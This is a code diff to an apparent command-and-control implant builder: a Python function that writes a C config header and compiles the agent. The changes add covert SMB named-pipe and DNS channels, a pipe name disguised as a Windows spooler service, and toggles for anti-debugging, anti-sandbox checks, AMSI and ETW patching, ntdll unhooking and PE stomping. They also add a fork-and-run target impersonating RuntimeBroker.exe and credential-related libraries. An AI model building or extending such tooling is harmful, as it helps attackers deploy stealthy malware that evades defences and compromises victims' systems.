@@ -83,6 +83,7 @@ def generate_config_h(
 #ifndef CONFIG_H
 #define CONFIG_H
 
+/* ─── C2 Connection ─── */
 #define CONFIG_C2_URL       "{listener_url}"
 #define CONFIG_SLEEP_MS     {sleep_ms}
 #define CONFIG_JITTER_PCT   {jitter_pct}
@@ -90,6 +91,7 @@ def generate_config_h(
 #define CONFIG_MAGIC        0x{magic:08X}
 #define CONFIG_AGENT_VER    "1.0.0"
 
+/* ─── HTTP Profile ─── */
 #define CONFIG_COOKIE_NAME  "{cookie_name}"
 #define CONFIG_URI_PATH     "{uri_path}"
 #define CONFIG_USER_AGENT   "{user_agent}"
@@ -97,6 +99,37 @@ def generate_config_h(
 #define CONFIG_RESP_WRAPPER_BEFORE  "{wrapper_before}"
 #define CONFIG_RESP_WRAPPER_AFTER   "{wrapper_after}"
 
+/* ─── SMB Named Pipe Channel ─── */
+#define CONFIG_PIPE_NAME    "\\\\\\\\.\\\\pipe\\\\spoolsvc"
+#define CONFIG_PIPE_ENABLED 0
+#define CONFIG_PIPE_HOST    ""
+
+/* ─── DNS Channel ─── */
+#define CONFIG_DNS_DOMAIN   ""
+#define CONFIG_DNS_ENABLED  0
+
+/* ─── Channel Management ─── */
+#define CONFIG_CHANNEL_PRIORITY      "http"
+#define CONFIG_CHANNEL_MAX_FAILURES  5
+
+/* ─── Evasion Toggles ─── */
+#define CONFIG_ANTI_DEBUG        1
+#define CONFIG_ANTI_SANDBOX      1
+#define CONFIG_PATCH_AMSI        1
+#define CONFIG_PATCH_ETW         1
+#define CONFIG_UNHOOK_NTDLL      1
+#define CONFIG_SLEEP_OBFUSCATE   1
+#define CONFIG_STACK_SPOOF       0
+#define CONFIG_INDIRECT_SYSCALLS 0
+#define CONFIG_PE_STOMP          1
+#define CONFIG_API_HASHING       1
+#define CONFIG_MODULE_STOMP      0
+
+/* ─── Process / Fork&Run ─── */
+#define CONFIG_SPAWN_TO          L"C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe"
+#define CONFIG_FORK_TIMEOUT_MS   30000
+
+/* ─── RSA Public Key (for key exchange) ─── */
 static const unsigned char RSA_MODULUS[] = {{
     {bytes_to_c_array(rsa_modulus)}
 }};
@@ -231,6 +264,8 @@ def build_agent(
         "-o", str(output_path),
     ] + [str(f) for f in src_files] + [
         "-lbcrypt", "-lwinhttp", "-ladvapi32", "-lkernel32", "-lntdll",
+        "-ldnsapi", "-lole32", "-loleaut32", "-liphlpapi", "-lws2_32",
+        "-lgdi32", "-lcredui", "-luser32", "-ldbghelp", "-lshlwapi",
         "-static-libgcc", "-Wl,--subsystem,console",
     ]
 
